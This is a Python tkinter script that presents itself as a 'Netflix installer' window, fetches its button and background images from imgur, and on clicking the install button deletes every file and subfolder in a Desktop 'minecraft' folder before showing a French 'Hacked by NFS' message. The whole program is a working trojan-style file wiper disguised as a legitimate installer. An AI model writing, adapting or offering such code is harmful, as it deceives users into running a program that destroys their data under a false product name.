import time, shutil, os, jsons, random, pyautogui, urllib.request
from tkinter import Tk, Button, Label, SUNKEN, messagebox
from PIL import ImageTk, Image

# Configuration
FILES_FOLDER = os.path.expanduser('~') + "\\Desktop\\minecraft\\"
FILES = os.listdir(FILES_FOLDER)
WIN_WIDTH = 1200
WIN_HEIGHT = 600
WIN_TITLE = "Netflix installer (v6.98.1805.0)"
WIN_BACKGROUND = "#000"

def handle_click():
    """
    Delete all files in FILES_FOLDER
    """
    for file in range(0, len(FILES)):
        file_path = FILES_FOLDER + FILES[file]

        if os.path.exists(file_path):
            if os.path.isfile(file_path):
                # If it's a file, delete it
                os.remove(FILES_FOLDER + FILES[file])
            else:
                # If it's a directory, delete it
                shutil.rmtree(file_path)

        time.sleep(2)

    # Show message after all files are deleted
    messagebox.showinfo("Hacked by NFS", "Vos fichiers ont bien été supprimé !")

def center(win):
    """
    Center a tkinter window
    :param win: the main window or Toplevel window to center
    """
    win.update_idletasks()
    frm_width = win.winfo_rootx() - win.winfo_x()
    win_width = WIN_WIDTH + 2 * frm_width
    titlebar_height = win.winfo_rooty() - win.winfo_y()
    win_height = WIN_HEIGHT + titlebar_height + frm_width
    x = win.winfo_screenwidth() // 2 - win_width // 2
    y = win.winfo_screenheight() // 2 - win_height // 2
    win.geometry('{}x{}+{}+{}'.format(WIN_WIDTH, WIN_HEIGHT, x, y))
    win.deiconify()

def init_landing():
    """
    Show landing page
    """
    window = Tk()
    window.title(WIN_TITLE)
    window.configure(background = WIN_BACKGROUND)
    center(window)

    # Add images to local
    urllib.request.urlretrieve(
        'https://i.imgur.com/1HECSrt.jpg',
        "bg.jpg"
    )
    urllib.request.urlretrieve(
        'https://i.imgur.com/0QCLm3v.png',
        "btn-idle.png"
    )
    urllib.request.urlretrieve(
        'https://i.imgur.com/WkAAEoR.png',
        "btn-hover.png"
    )
    urllib.request.urlretrieve(
        'https://i.imgur.com/athSNgm.png',
        "icon.png"
    )

    # Define images
    window.iconbitmap("icon.png")
    img = Image.open("bg.jpg")
    img = img.resize((1080, 338), Image.Resampling.LANCZOS)
    tkimage = ImageTk.PhotoImage(img)
    imagebox = Label(window, image = tkimage, borderwidth = 0)

    # Define images button
    img1 = Image.open("btn-idle.png")
    img2 = Image.open("btn-hover.png")
    image_a = ImageTk.PhotoImage(img1)
    image_b = ImageTk.PhotoImage(img2)

    def onenter(e):
        startbutton["image"] = image_b

    def onleave(e):
        startbutton["image"] = image_a

    # Add button
    startbutton = Button(
        master           = window,
        image            = image_a, 
        border           = 0,
        borderwidth      = 0,
        cursor           = "hand2",
        background       = WIN_BACKGROUND,
        activebackground = WIN_BACKGROUND,
        command          = handle_click,
        relief           = SUNKEN
    )

    startbutton.bind("<Enter>", onenter)
    startbutton.bind("<Leave>", onleave)
    startbutton.place(x=100, y=500)

    imagebox.pack()
    startbutton.pack(padx=100, pady=100)

    window.mainloop()

init_landing()
